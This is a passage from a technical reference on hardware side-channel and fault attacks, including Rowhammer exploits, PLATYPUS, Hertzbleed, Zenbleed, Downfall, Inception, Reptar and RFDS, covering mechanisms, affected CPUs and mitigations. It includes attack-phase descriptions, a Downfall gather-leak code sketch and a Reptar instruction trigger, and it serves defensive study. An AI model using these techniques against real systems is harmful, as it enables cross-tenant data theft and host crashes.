3. **KSM-based placement (cross-VM).** In KVM environments with KSM enabled, the attacker creates pages with known content. KSM scans for identical pages across VMs and merges them into a single physical page with copy-on-write. The attacker then Rowhammers the row containing the merged page. When the victim VM reads the page, it reads the corrupted (flipped) data.

### 2.7 Real-world Rowhammer exploits

**Google Project Zero NaCl escape (2015).** The first demonstrated Rowhammer exploit. Mark Seaborn and Thomas Dullien (Google Project Zero, disclosed March 2015) used double-sided Rowhammer to flip bits in page-table entries from within Google Chrome's NaCl (Native Client) sandbox. The PTE flip granted the NaCl process access to physical pages outside its sandbox, achieving arbitrary read/write to all physical memory and full sandbox escape. This exploit ran on DDR3 laptop DRAM and required approximately 15 minutes of hammering. The disclosure prompted NaCl to restrict the `clflush` instruction and Google to fast-track DRAM vendor engagement on TRR deployment.

**Drammer (CVE-2016-6728, 2016).** The first Rowhammer exploit on ARM (Android). The VUSec group demonstrated Rowhammer on LPDDR3/LPDDR4 mobile DRAM, exploiting the Android ION memory allocator to control physical page placement. Because ARM lacks a user-accessible `clflush` instruction, Drammer uses uncached DMA memory mappings (obtained via the ION allocator's `ION_HEAP_TYPE_SYSTEM_CONTIG` flag) to bypass the cache and directly activate DRAM rows. Drammer achieved root on multiple Android phones (Nexus 5, LG G4, Samsung Galaxy S6) within 1-2 minutes of hammering.

**GLitch (2018).** VUSec demonstrated GPU-based Rowhammer: the mobile GPU (Adreno, Mali) can access physical memory via uncached mappings, and GPU shader programs can hammer DRAM rows. GLitch bypasses both CPU-cache-based defenses and ARM's lack of `clflush` by using the GPU's memory interface. Demonstrated on ARM SoCs with Adreno GPUs (Qualcomm Snapdragon).

**Flip Feng Shui (2016).** Razavi et al. demonstrated cross-VM Rowhammer in KVM/QEMU environments. The attack exploits KSM (Kernel Same-page Merging, Linux's memory deduplication): when two VMs contain identical memory pages, KSM merges them into a single physical page (copy-on-write). The attacker VM creates pages with known content, waits for KSM to merge them with the victim VM's pages, then Rowhammers to flip bits in the merged page. Since the page is shared (via CoW), the flip affects the victim's view of the data. Demonstrated to corrupt RSA public keys in a victim VM's OpenSSH `authorized_keys`, allowing the attacker to forge SSH authentication.

The Flip Feng Shui attack has three phases with distinct timing constraints. In the profiling phase (offline, before the attack), the attacker identifies physical rows with high bit-flip vulnerability by Rowhammering its own memory and cataloging which rows and bit positions are susceptible. In the massaging phase (minutes to hours, depending on KSM scan interval), the attacker creates pages whose content matches the victim's target data (e.g., a copy of the victim's `authorized_keys` file) and waits for KSM to merge them. KSM's scan interval is configurable (default: 200 ms per batch of pages, with a configurable `pages_to_scan` parameter); the attacker monitors `/sys/kernel/mm/ksm/pages_shared` to detect when merging has occurred. In the hammering phase (seconds to minutes), the attacker Rowhammers the row containing the merged page. The CoW mechanism means that the victim's view of the page is updated by the flip (since the CoW has not been triggered — no write has occurred), while the attacker's view splits off into a private copy on the attacker's next write (triggering CoW for the attacker, leaving the victim with the corrupted shared page).

**RAMBleed (CVE-2019-0174, 2019).** A Rowhammer-based data exfiltration attack (rather than corruption). RAMBleed uses the observation that Rowhammer bit flips are data-dependent: whether a bit flips in the victim row depends on the values stored in the adjacent aggressor row's cells (due to the electromagnetic coupling direction). By hammering with known data in the aggressor rows and observing which victim-row bits flip, the attacker can infer the victim row's bit values — reading data without writing to it. RAMBleed demonstrated extraction of an OpenSSH RSA-2048 host key from an adjacent process's memory, without any write access to the victim process's pages.

### 2.8 ARM and mobile Rowhammer

Mobile DRAM (LPDDR4, LPDDR5) presents specific challenges and opportunities for Rowhammer:

**Cache bypass on ARM.** ARM CPUs generally do not expose a user-accessible cache-flush instruction equivalent to x86's `clflush`. Attackers use alternative cache-bypass mechanisms:
- Uncached DMA mappings (as in Drammer) via ION or similar allocators.
- Cache eviction via eviction-set access patterns (slower than `clflush` but universally available).
- GPU memory access (as in GLitch) via OpenGL/Vulkan compute shaders.
- ARM's `DC CIVAC` (Data Cache Clean and Invalidate by VA to PoC) instruction, available on some ARM implementations in user mode (implementation-defined).

**DRAM address mapping on ARM.** ARM SoCs use diverse memory controllers with non-standard address-mapping functions. Reverse-engineering requires platform-specific timing analysis (the DRAMA approach works but must be adapted for each SoC's memory controller behavior).

**LPDDR4/LPDDR5 vulnerability.** Mobile DRAM uses smaller process nodes and lower operating voltages, making cells more susceptible to charge disturbance. Research has shown that LPDDR4 modules generally flip at lower activation counts than desktop DDR4, though the exact threshold varies by vendor and process generation. LPDDR5 introduces per-row hammering counters and per-bank refresh as potential mitigations, but initial research suggests these can be evaded with sufficiently complex patterns.

**Mobile exploitation impact.** The Drammer exploit on Android demonstrated that Rowhammer on mobile devices can achieve full device compromise (root access) without any software vulnerability. The attack runs as a regular Android app (no permissions required beyond memory allocation) and can root the device in 1-2 minutes on vulnerable hardware. This is particularly significant because Android's security model relies on kernel integrity — once the kernel is compromised via PTE bit flips, all higher-level protections (SELinux, app sandboxing, verified boot attestation) are undermined.

**Rowhammer on Apple Silicon.** Apple's M-series processors use LPDDR4X/LPDDR5 memory soldered to the SoC package. Research has demonstrated Rowhammer bit flips on Apple M1 and M2 systems (2022-2023), though Apple's memory controller implements aggressive refresh policies that raise the required activation count. The exploitation path is complicated by Apple's custom memory-controller configuration and the lack of public documentation for the DRAM address-mapping function. No public root exploit via Rowhammer on Apple Silicon has been demonstrated as of 2025, but the vulnerability exists at the DRAM physics level.

### 2.9 Detection and defense

**ECC memory.** SECDED (Single Error Correction, Double Error Detection) ECC corrects single-bit errors per ECC word (64 or 128 bits, depending on the ECC scheme). Rowhammer typically flips one bit per ECC word, which ECC silently corrects. The flip still occurs — ECC does not prevent charge disturbance — but the corrected value is returned on read.

**ECCploit (2019).** Cojocar et al. demonstrated that ECC can be bypassed by inducing multiple bit flips in the same ECC word. By careful selection of aggressor patterns and exploitation of cells with low flip thresholds, the attacker can achieve two-bit flips in the same 64-bit ECC word. SECDED detects (but cannot correct) two-bit errors, causing a machine check exception. However, if three or more bits flip in the same word, ECC may miscorrect (silently produce wrong data), which is more dangerous than a detected error. ECCploit demonstrated this on server ECC DIMMs, though the attack is probabilistic and requires significant hammering time.

The ECCploit methodology involves a profiling phase where the attacker identifies "hot cells" — DRAM cells that flip at unusually low activation counts. By correlating hot cells across adjacent rows (using the timing-based bank detection from §2.3), the attacker identifies victim rows where multiple hot cells fall within the same ECC word. The profiling takes hours to days per DIMM but produces a persistent map that remains valid as long as the DIMM is not replaced.

**On-die ECC (DDR5).** DDR5 modules include DRAM-internal ECC that corrects single-bit errors per 128-bit access before the data leaves the DRAM chip. This on-die ECC is transparent to the memory controller — the controller sees already-corrected data. While on-die ECC reduces the externally-visible bit-flip rate, it does not prevent the underlying charge disturbance. If the on-die ECC corrects a Rowhammer-induced flip, the correction consumes the error-correction capacity, leaving the same ECC word vulnerable to a second independent error (from data retention, cosmic rays, or a subsequent hammer pass). The on-die ECC also does not report corrected errors to the memory controller, making it impossible to detect Rowhammer activity via ECC error counters on DDR5 — a monitoring blind spot.

**Hardware performance counter monitoring.** Excessive `clflush` operations and LLC misses during Rowhammer produce distinctive patterns in hardware performance counters:
- `LLC_MISS` events at rates far exceeding normal workload patterns.
- `OFFCORE_RESPONSE` events indicating frequent DRAM accesses to the same bank.
- High `L2_RQSTS.DEMAND_DATA_RD_MISS` rates.
Runtime monitoring of these counters (via `perf_event_open` or Intel CAT/MBM) can detect Rowhammer attempts, though false positives from legitimate high-bandwidth workloads require careful thresholding.

**PARA (Probabilistic Adjacent Row Activation).** Proposed by Kim et al. (2014): on every ACTIVATE command, the memory controller probabilistically (with low probability, e.g., 1/1000) also activates and refreshes the adjacent rows. This provides statistical protection proportional to the hammering rate — the more an aggressor row is activated, the more likely its neighbors are refreshed. PARA imposes approximately 0.2-0.5% performance overhead and requires memory-controller firmware changes.

**Increased refresh rates.** Halving the refresh interval (32 ms instead of 64 ms) doubles the refresh overhead (from ~4% to ~8% of DRAM bandwidth) but halves the attacker's hammering window, requiring twice as many activations per unit time. Some DRAM vendors have deployed increased refresh rates on vulnerable modules as a stop-gap measure.

**In-DRAM mitigations (RFM — Refresh Management).** DDR5 introduces the RFM (Refresh Management) command, which allows the memory controller to issue targeted refresh commands for specific aggressor-adjacent rows. RFM is paired with DRAM-internal per-row activation counters that track which rows are being hammered. When a counter exceeds a threshold, the DRAM signals the controller to issue an RFM. The effectiveness of RFM depends on the counter accuracy and the attacker's ability to distribute activations across many rows (as in Blacksmith-style patterns).

**Software-based Rowhammer detection tools.** Several open-source tools exist for testing DRAM vulnerability:

```bash
# rowhammer_test (Google) — simple double-sided hammer test
# Tests for bit flips using pairs of addresses in the same bank
git clone https://github.com/google/rowhammer-test
cd rowhammer-test && make
./rowhammer_test
# Reports: "Bit flip found at physical address 0x..."

# TRRespass — TRR-aware many-sided hammering
git clone https://github.com/vusec/trrespass
# Requires root for pagemap access and huge page allocation
# Tests multiple aggressor patterns to find TRR bypass sequences

# Blacksmith — non-uniform frequency-based fuzzer
git clone https://github.com/comsec-group/blacksmith
# Generates and tests thousands of non-uniform patterns
# Reports which patterns induce flips on the specific DIMM
```

**Kernel-level defenses.** Beyond DRAM-level mitigations, the Linux kernel implements several Rowhammer-aware defenses:

- **KSM deduplication restriction.** KSM can be disabled (`echo 0 > /sys/kernel/mm/ksm/run`) to prevent cross-VM Rowhammer via shared pages. Cloud providers (AWS, GCP) disable KSM by default for security reasons.
- **CAP_SYS_ADMIN restriction on pagemap.** Since Linux 4.0, reading physical frame numbers from `/proc/PID/pagemap` requires `CAP_SYS_ADMIN`, making targeted Rowhammer (requiring knowledge of physical-to-DRAM mapping) harder from unprivileged contexts.
- **Huge page allocation policies.** Restricting THP (setting `/sys/kernel/mm/transparent_hugepage/enabled` to `never`) prevents attackers from obtaining physically-contiguous memory without privileges. This increases the difficulty of bank/row identification and targeted hammering.
- **DRAM row isolation.** Research proposals (CATTmew, GuardION) suggest allocating guard rows (empty rows that absorb disturbance) between security-critical data and user-accessible rows. These have not been widely deployed due to the significant memory overhead (up to 50% DRAM waste in worst-case configurations).

---

## 3. Other hardware attacks

### 3.1 PLATYPUS (CVE-2020-8694, CVE-2020-8695)

**Mechanism.** Intel's RAPL (Running Average Power Limit) interface exposes per-domain energy consumption counters via MSRs (`MSR_PKG_ENERGY_STATUS`, `MSR_DRAM_ENERGY_STATUS`) and the Linux `powercap` sysfs interface (`/sys/class/powercap/intel-rapl/`). These counters update at microsecond granularity and report energy in microjoule units. PLATYPUS demonstrates that these counters provide sufficient resolution for software-based power analysis attacks — the equivalent of connecting a physical power probe to the CPU, but using the CPU's own telemetry.

**Exploitation.** The attacker measures RAPL energy consumption during victim execution (SGX enclave, AES-NI operations, or any computation with data-dependent power consumption). By collecting many traces (thousands to millions of measurements) and applying differential power analysis (DPA) or simple power analysis (SPA) techniques, the attacker recovers cryptographic keys.

Against SGX enclaves, PLATYPUS can extract AES keys being processed by the enclave's AES-NI instructions. The attack requires co-location on the same physical CPU and the ability to trigger repeated enclave invocations with known or chosen plaintexts.

**Affected CPUs.** All Intel CPUs with RAPL support (Sandy Bridge and later). AMD CPUs have similar energy-reporting interfaces (RAPL-equivalent MSRs) and are potentially vulnerable, though PLATYPUS was demonstrated only on Intel.

**Detection.** Monitoring access patterns to `powercap` sysfs entries or RAPL MSRs from unprivileged processes. Abnormally high-frequency RAPL reads (>1000/s) from a non-management process are suspicious.

**Mitigation.** CVE-2020-8694 addresses the Linux kernel: RAPL `powercap` access is restricted to `CAP_SYS_ADMIN` (committed in kernel 5.10). CVE-2020-8695 addresses the microcode: the `RAPL_ENERGY_FILTERING` feature (enabled by microcode update) adds noise to the energy counters, reducing the signal-to-noise ratio below the threshold for successful DPA. Additionally, the `perf_event_paranoid` sysctl can restrict access to performance counters.

```bash
# Verify RAPL access restrictions
# On patched systems, unprivileged read of powercap should be denied
cat /sys/class/powercap/intel-rapl:0/energy_uj
# Should return "Permission denied" for non-root users

# Check perf_event_paranoid level
cat /proc/sys/kernel/perf_event_paranoid
# Value >= 3 restricts all perf events to CAP_SYS_ADMIN
```

**PoC availability.** The PLATYPUS researchers (TU Graz) released a proof-of-concept demonstrating AES key extraction from a co-located SGX enclave. The PoC requires approximately 100,000 encryption invocations to recover a 128-bit AES key using CPA (Correlation Power Analysis) on the RAPL energy traces.

### 3.2 Hertzbleed (CVE-2022-23823, CVE-2022-24436)

**Mechanism.** Dynamic Voltage and Frequency Scaling (DVFS) adjusts the CPU clock frequency based on power and thermal conditions. The critical insight is that DVFS responds not only to workload intensity but to the specific data being processed: certain operand values cause higher power draw (more transistor switching), which triggers frequency throttling, which changes wall-clock execution time. This converts a power side channel into a timing side channel — observable remotely.

**Exploitation.** Hertzbleed targets cryptographic implementations where execution time depends on the secret key via the DVFS mechanism. The original demonstration extracted SIKE (Supersingular Isogeny Key Encapsulation) keys by measuring the wall-clock time of key-exchange operations over a network. The SIKE implementation used variable-time multi-precision integer arithmetic whose power consumption (and thus DVFS-induced frequency) depended on the key bits.

The attack is remote: the attacker sends key-exchange requests to the victim server and measures response times. Thousands of measurements, combined with statistical analysis of the DVFS-induced timing variations, recover the key bits. The timing differences are in the microsecond range — larger than typical network jitter on low-latency links.

The fundamental insight is that Hertzbleed converts a power side channel (which traditionally requires physical proximity to the device) into a timing side channel (observable remotely). Any computation where power consumption depends on secret data is potentially vulnerable, not just SIKE. This includes: non-constant-time modular exponentiation (RSA, DSA), Hamming-weight-dependent operations on secret keys, and data-dependent memory-access patterns that change power draw (cache hits vs. misses consume different power).

**Frequency-throttling measurement.** The attacker does not need to measure the CPU frequency directly. Instead, the frequency difference manifests as a wall-clock execution time difference for a fixed number of operations. For example, if processing key bit "1" causes a 2% frequency reduction compared to key bit "0" (due to higher power draw), a computation that takes 1 million cycles will complete in 500,000 ns at 2.0 GHz but in 510,204 ns at 1.96 GHz — a 10 μs difference that is measurable even over a network link. By repeating the measurement and averaging, the attacker achieves sufficient signal-to-noise ratio to distinguish the key bits.

**Interaction with Intel Speed Select Technology (SST).** Intel's SST allows per-core frequency configuration on Xeon processors, providing finer-grained DVFS control. In theory, SST could be used to lock specific cores to a fixed frequency (eliminating the Hertzbleed side channel for those cores). However, SST is a server-only feature, and locking frequency defeats the power-efficiency purpose of DVFS. No cloud provider currently offers per-core frequency locking as a Hertzbleed mitigation.

**Affected CPUs.** CVE-2022-23823 (AMD): all modern AMD CPUs with DVFS (Zen and later). CVE-2022-24436 (Intel): all modern Intel CPUs with Turbo Boost. ARM processors with dynamic frequency scaling are potentially vulnerable as well.

**Exploitation prerequisites.** The victim must execute a cryptographic computation whose power consumption varies with secret data. Constant-time implementations (constant power consumption regardless of operand values) defeat Hertzbleed because they produce constant DVFS behavior. The attacker needs the ability to trigger repeated computations with controlled inputs and to measure wall-clock time with microsecond precision.

**PoC availability.** The Hertzbleed researchers released a proof-of-concept for SIKE key extraction. However, SIKE was subsequently broken by a mathematical attack (unrelated to Hertzbleed) and is no longer a candidate for standardization.

**Mitigation.** The primary defense is constant-time (and constant-power) cryptographic implementations. Disabling DVFS (fixing the CPU frequency) eliminates the side channel but incurs significant power consumption and thermal penalties, making it impractical for most deployments. Intel and AMD have stated they do not plan to mitigate Hertzbleed in hardware, classifying it as a software responsibility (constant-time coding).

Hertzbleed's classification as a "software problem" by CPU vendors is contentious among researchers. The argument for hardware responsibility: DVFS frequency scaling based on data-dependent power consumption is a hardware design choice that creates the side channel. The argument for software responsibility: constant-time coding (which is already required to defend against cache-timing side channels) also defends against Hertzbleed. In practice, Hertzbleed is a reminder that "constant-time" must mean "constant-power" — an implementation that is constant-time (same instruction sequence regardless of data) but not constant-power (different operand values cause different power draw in the execution units) is vulnerable. Achieving true constant-power behavior requires avoiding data-dependent internal operations in the ALU, which is difficult to verify and depends on the CPU's microarchitectural implementation of each instruction.

### 3.3 Zenbleed (CVE-2023-20593)

**Mechanism.** A speculative-execution vulnerability specific to AMD Zen 2 processors (Ryzen 3000/4000 series, EPYC 7002 "Rome," Threadripper 3000). The bug involves the `VZEROUPPER` instruction, which clears the upper 128 bits of all YMM registers (the AVX extension of XMM registers). This instruction is critical for performance: it avoids the SSE-AVX transition penalty that occurs when switching between 128-bit SSE and 256-bit AVX code.

Under specific conditions involving speculative execution and register renaming, a mispredicted `VZEROUPPER` marks physical registers as "zeroed" in the register rename table without actually zeroing them. When the misprediction is detected and rolled back, the register rename table is not correctly restored — leaving the physical registers in a state where they can be read by subsequent instructions. These physical registers may contain data from prior executions by other processes, other threads, other privilege levels, or other VMs on the same physical core.

**Exploitation.** The exploit is remarkably simple. Tavis Ormandy (Google Project Zero) published a compact PoC that leaks data at approximately 30 KB/s per core:

```c
// Simplified Zenbleed trigger concept
// The actual PoC uses carefully timed VZEROUPPER + SIMD operations
// to create and exploit the misprediction window

// The attacker repeatedly executes:
// 1. VZEROUPPER (speculatively mispredicted)
// 2. SIMD register read (reads stale data from physical register file)

// The leak reads arbitrary register data from:
// - Other processes on the same core
// - The kernel
// - Other VMs (if hyperthreading is enabled)
```

The vulnerability is particularly dangerous because it requires no special privileges — any unprivileged user-space code can trigger the leak. It is also difficult to detect because the trigger instructions (`VZEROUPPER`, SIMD loads) are common in normal application code.

In cloud environments, Zenbleed allows a malicious VM to leak data from other VMs and from the hypervisor running on the same physical core. The leaked data includes anything that passes through YMM registers: string operations (glibc's optimized `memcpy`/`strlen` use AVX), cryptographic computations (AES-NI results, SHA-NI results), and floating-point data. The 30 KB/s leak rate per core, sustained over minutes, can exfiltrate meaningful quantities of sensitive data (passwords, session tokens, private keys).

**Affected CPUs.** All AMD Zen 2 microarchitecture: Ryzen 3000 series, Ryzen 4000 series (mobile), EPYC 7002 "Rome," Threadripper 3000 series.

**Mitigation.** AMD released a microcode update that fixes the register-clearing behavior. A software workaround (chicken bit) is available by setting bit 9 of the `DE_CFG` MSR (MSR `0xC0011029`):

```bash
# Software workaround: set DE_CFG[9] chicken bit
# This disables the optimization that causes the bug
# Performance impact: minor regression on AVX-heavy workloads
wrmsr -p <core_id> 0xC0011029 $(rdmsr 0xC0011029 | python3 -c \
  "import sys; v=int(sys.stdin.read().strip(),16); print(hex(v | (1<<9)))")
```

The chicken bit is a temporary workaround; the microcode update is the proper fix.

### 3.4 Downfall / Gather Data Sampling (GDS, CVE-2022-40982)

**Mechanism.** Affects Intel CPUs from 6th generation (Skylake) through 11th generation (Rocket Lake/Tiger Lake). The AVX2 `GATHER` instructions (`VPGATHERDD`, `VPGATHERDQ`, `VPGATHERQD`, `VPGATHERQQ`) and AVX-512 gather variants perform vectorized memory loads from non-contiguous addresses specified by a vector of indices. Internally, the CPU implements gather as a sequence of scalar loads into a shared internal buffer.

The vulnerability: this shared buffer is not properly partitioned between security domains. When a gather instruction executes, it may read stale data from the buffer that was left by a prior gather operation executed by a different thread, a different process, the kernel, or an SGX enclave running on the same physical core. The stale data is forwarded to the gather's result register, where it can be encoded into cache state via a transient-execution gadget.

**Exploitation.** The attacker executes gather instructions in a loop, with the index vector set to trigger the buffer-stale-data condition. The gathered values contain fragments of data from other security domains. A FLUSH+RELOAD side channel encodes and recovers the data:

```c
// Downfall / GDS exploitation concept
// Attacker runs on the same physical core as the victim
// (same core, different hyperthread or process)

// Step 1: Execute GATHER repeatedly to sample stale buffer data
__m256i index = _mm256_set_epi32(0,1,2,3,4,5,6,7);
while (1) {
    __m256i result = _mm256_i32gather_epi32(
        (int *)base_addr, index, 4);
    // result may contain stale data from another security domain

    // Step 2: Encode gathered values into cache (FLUSH+RELOAD)
    // Extract each lane and use as array index
    int leaked_byte = _mm256_extract_epi32(result, 0) & 0xFF;
    volatile char tmp = probe_array[leaked_byte * 4096];
}
// Step 3: FLUSH+RELOAD probe_array to recover leaked_byte
```

Downfall can leak data at approximately 1-8 bytes per sample, with a sampling rate limited by the gather instruction throughput. The attack has been demonstrated to extract AES keys, arbitrary kernel memory, and SGX enclave secrets.

**Affected CPUs.** Intel 6th gen (Skylake) through 11th gen (Tiger Lake/Rocket Lake). 12th gen (Alder Lake) and later are NOT affected. Server processors (Xeon Scalable) in the same generation range are also affected.

**Mitigation.** Intel released a microcode update that serializes gather operations: each gather fully completes (including clearing the internal buffer) before the next gather can begin. This eliminates the stale-data condition but imposes significant performance overhead: up to 50% regression on AVX2/AVX-512-heavy workloads (machine learning inference, scientific computing, video encoding). The kernel parameter `gather_data_sampling=off` disables the mitigation for workloads that accept the security risk in exchange for performance.

**Detection.** The `VERW` instruction was extended (via the same microcode update) to clear the gather buffers. The kernel exposes the vulnerability status via `/sys/devices/system/cpu/vulnerabilities/gather_data_sampling` (values: "Not affected", "Vulnerable", "Mitigation: Microcode").

**Performance impact analysis.** The mitigation's performance cost is heavily workload-dependent. Workloads that do not use AVX2/AVX-512 gather instructions see zero overhead. Workloads that use gather heavily (machine-learning inference with sparse matrix operations, columnar database engines like ClickHouse, video codecs like x265) can see 20-50% regression. Intel provides a sysfs control (`gather_data_sampling=off`) to disable the mitigation selectively for performance-critical workloads that accept the risk. Cloud providers (AWS, GCP, Azure) applied the mitigation globally on their fleet, absorbing the performance cost, and do not expose the opt-out to tenants. The severity assessment for Downfall is high in multi-tenant environments (CVSS 6.5 base score per Intel, though researchers argue it should be higher due to the cross-domain data leakage). Single-tenant bare-metal systems running only trusted code can reasonably disable the mitigation via the `gather_data_sampling=off` parameter after explicit risk acceptance.

**Compiler-level mitigations.** GCC 14 and Clang 17 added the `-mno-gather` flag, which instructs the compiler to never emit `GATHER` instructions (using scalar load loops instead). This eliminates the Downfall attack surface from compiled code at a modest performance cost (5-15% for gather-heavy loops). The `-mno-gather` flag can be applied selectively to security-critical compilation units (e.g., crypto libraries) while leaving performance-critical units (e.g., SIMD-optimized numerical code) with gather enabled.

**PoC availability.** Daniel Moghimi (Google) published the Downfall PoC, demonstrating extraction of 128-bit AES keys from a co-located OpenSSL process and extraction of arbitrary kernel memory. The PoC is available on the researcher's GitHub and requires only unprivileged user-space execution.

### 3.5 Inception (CVE-2023-20569)

**Mechanism.** An AMD-specific attack targeting the return-address prediction mechanism. AMD Zen 1-4 processors use a Return Address Predictor (RAP) that is architecturally similar to the Return Stack Buffer (RSB) on Intel, but with different aliasing and training behavior.

Inception combines two techniques:
1. **Phantom speculation.** The attacker creates a speculative execution window by manipulating the branch predictor state such that a non-branch instruction is transiently executed as if it were a branch. This is achieved by training the branch predictor at a specific address (in the attacker's address space) that aliases with the victim's instruction address in the predictor's lookup table.
2. **Training in Transient Execution (TTE).** During the phantom speculative window, the attacker executes training sequences that poison the RAP with attacker-chosen return targets. Because the training happens during transient (speculative) execution, it is invisible to the architectural execution flow — the training is never committed, but the RAP state is modified (since predictor state is not rolled back on misprediction).

The combined effect: the attacker controls where the victim's `RET` instructions speculatively return to, without ever needing to execute code in the victim's address space. This is a strict upgrade over Spectre-RSB because the poisoning is stealthy (transient) and does not require any shared memory or same-address-space code execution.

**Exploitation.** Inception demonstrated leakage of kernel data from AMD Zen 1-4 processors. The attacker trains the victim kernel's return predictor to speculatively return to a kernel gadget that reads secret data and encodes it into cache state. The attacker then recovers the data via a cache side channel.

**Affected CPUs.** All AMD Zen 1 (Ryzen 1000, EPYC 7001), Zen 2 (Ryzen 3000/4000, EPYC 7002), Zen 3 (Ryzen 5000, EPYC 7003), and Zen 4 (Ryzen 7000, EPYC 9004) processors.

**Mitigation.** AMD released microcode updates providing `IBPB_BRTYPE` — a new variant of IBPB that specifically flushes the branch-type prediction state (including the RAP). The kernel applies `IBPB_BRTYPE` on context switches and privilege transitions. Additionally, the kernel's `safe_ret` mechanism (a retpoline-like construct for returns) prevents speculative returns to attacker-controlled targets. Performance impact: approximately 5-10% on syscall-heavy workloads due to the additional predictor flushes.

**Relationship to Spectre-RSB.** Inception subsumes Spectre-RSB on AMD: it provides a more powerful primitive (transient training that is invisible to architectural execution) that achieves the same result (controlled speculative return targets). Previous Spectre-RSB mitigations (RSB stuffing on context switches) are insufficient against Inception because they do not clear the RAP state that Inception poisons. The `IBPB_BRTYPE` mitigation is strictly more comprehensive than RSB stuffing, flushing all branch-type prediction state including the RAP.

**Affected workloads and detection.** Inception exploitation requires the attacker to execute code on the same physical core as the victim (or control a VM on the same core). The attack is not remotely exploitable — it requires local code execution. However, in cloud multi-tenancy, any co-located VM can potentially execute the attack. Detection is extremely difficult because the trigger instructions (branches, returns) are ubiquitous in normal code. No hardware performance counter reliably distinguishes Inception training from normal execution.

### 3.6 Reptar (CVE-2023-23583)

**Mechanism.** An Intel-specific bug triggered by the `REP MOVSB` instruction (optimized string copy) with a specific combination of redundant prefixes. Modern x86 CPUs are documented to ignore redundant or conflicting prefixes. However, on affected Intel CPUs, a `REP MOVSB` instruction preceded by a specific Rex prefix combination causes the CPU's microcode state machine to enter an incorrect state.

The consequences of the incorrect state depend on the CPU model and the execution context:
- On some CPUs, the incorrect state causes a Machine Check Exception (#MC), halting the core.
- On others, the CPU executes incorrect microcode operations, corrupting data in registers or memory.
- In the worst case, the corrupted state affects other logical processors (hyper-threads) on the same physical core.

**Exploitation prerequisites and impact.** Any unprivileged user-space code can execute the trigger sequence (REP MOVSB with specific prefixes is a valid instruction sequence). In a multi-tenant environment (cloud VMs), one VM triggering Reptar can crash the host CPU or corrupt the state of VMs running on the sibling hyper-thread.

The vulnerability is primarily a denial-of-service and data-integrity risk rather than a confidentiality risk. However, the microcode-state corruption could theoretically be exploited for arbitrary code execution within the microcode layer, though no public exploit demonstrates this.

**Affected CPUs.** Intel 10th generation (Ice Lake) and later, including Alder Lake, Sapphire Rapids. Specific stepping/revision ranges are affected; Intel published detailed model/stepping lists in the security advisory INTEL-SA-00950.

**PoC availability.** Tavis Ormandy (Google Project Zero) published a minimal PoC — the trigger is a single instruction with specific prefixes. The PoC is approximately 10 lines of assembly, demonstrating the low barrier to triggering the bug. In a cloud environment, any tenant VM can execute the trigger instruction, potentially crashing the host or corrupting sibling VMs — making Reptar a critical-severity issue for cloud providers regardless of the data-confidentiality risk assessment.

```nasm
; Simplified Reptar trigger (illustrative — exact prefix combination
; varies by CPU stepping)
; The specific REX prefix + REP MOVSB combination triggers
; the microcode state machine error
    db 0x44        ; REX.R prefix
    rep movsb      ; F3 A4 — string copy with REP
; On affected CPUs, this causes #MC, hang, or state corruption
```

**Mitigation.** Microcode update that fixes the prefix-handling logic in the REP MOVSB microcode sequence. No software workaround exists — the trigger instruction is a valid x86 encoding that cannot be blocked without breaking legitimate code that uses REP MOVSB with prefixes. Cloud providers deployed emergency microcode updates within hours of the disclosure due to the denial-of-service risk to shared infrastructure.

**Broader implications of microcode bugs.** Reptar belongs to a class of vulnerabilities caused by errors in the CPU's microcode — the firmware-like layer that translates complex x86 instructions into micro-operations. Unlike speculative-execution side channels (which exploit deliberate hardware behaviors), microcode bugs are classical software bugs that happen to run in the CPU's microcode ROM. They are found through the same fuzzing and analysis techniques used for software, and they are fixed by microcode updates (patching the microcode ROM at boot time). The existence of Reptar-class bugs underscores that CPUs are not mathematically-verified hardware — they run millions of lines of microcode that are as susceptible to implementation bugs as any other software.

### 3.7 Register File Data Sampling (RFDS, CVE-2023-28746)

**Mechanism.** Affects Intel Atom-class processors: the E-cores in hybrid architectures (Alder Lake, Raptor Lake) and standalone Atom processors (Gracemont microarchitecture and earlier). On these processors, data from the register file (general-purpose registers, SIMD registers, and control registers) persists in the physical register file after the owning thread is descheduled. A subsequent thread running on the same physical core can speculatively access stale register values via transient execution.

The root cause is that Atom cores do not fully clear the register file on context switches or privilege transitions. When a new thread begins execution, its speculative operations may read stale values from physical registers that have not yet been overwritten with the new thread's data.

**Exploitation.** The attacker must be on the same physical core as the victim. The attacker's code uses transient execution (triggered by a deliberate misprediction) to read stale register values, encoding them into cache state for later recovery. The leaked data includes register values from the prior thread — which may contain cryptographic keys, pointers, or other secrets that were in registers at the time of the context switch.

**Affected CPUs.** Intel Atom-class cores: Gracemont (12th/13th gen hybrid E-cores), Tremont, Goldmont Plus, and earlier Atom microarchitectures. The P-cores (Golden Cove, Raptor Cove) in the same hybrid CPUs are NOT affected.

**Mitigation.** The `VERW` instruction is extended (via microcode update) to clear the register file on the Atom cores. The kernel executes `VERW` on every context switch and privilege transition on affected cores. The `/sys/devices/system/cpu/vulnerabilities/reg_file_data_sampling` sysfs entry reports the status.

**Hybrid architecture implications.** In hybrid-architecture CPUs (Alder Lake, Raptor Lake), the P-cores (Golden Cove, Raptor Cove) and E-cores (Gracemont) have different vulnerability profiles. RFDS affects only the E-cores. The kernel's scheduler must be aware of which core type a task is running on and apply `VERW` clearing only on affected E-cores (to avoid unnecessary overhead on P-cores). The scheduler's core-type awareness is handled by the `hybrid_cpu` infrastructure in the Linux kernel, which tags each core with its microarchitecture type. This asymmetric vulnerability handling is a new complexity introduced by hybrid architectures — previously, all cores on a CPU had the same vulnerability profile.

**Exploitation difficulty.** RFDS is harder to exploit than MDS because the register file is smaller and turns over faster than the fill buffers or store buffer. The attacker's transient-execution window must coincide with the victim's register values still being present in the physical register file. Practically, this means the attacker must be on the same physical core (E-core) and must time the trigger instruction closely after the victim's context switch. The leak rate is lower than MDS (bytes per second rather than kilobytes per second), but the leaked data is higher-value (register contents include keys, pointers, and intermediate computation results that are never written to memory).

### 3.8 GhostRace (CVE-2024-2193)

**Mechanism.** GhostRace demonstrates that speculative execution can create race conditions in synchronization primitives. When the kernel (or hypervisor) executes a synchronization check — such as `mutex_lock`, `spin_lock`, or `wait_event(condition)` — the branch predictor may mispredict the condition check, causing speculative execution to proceed past the lock/wait as if the lock were acquired or the condition were satisfied.

If the code past the synchronization check accesses shared data, and another thread is concurrently modifying that data, a speculative race condition occurs. This can manifest as:

- **Speculative Use-After-Free (SUAF).** Thread A frees an object. Thread B's lock check is speculatively bypassed, and Thread B speculatively accesses the freed object. The speculative access can leak the contents of the freed (and potentially reallocated) memory.
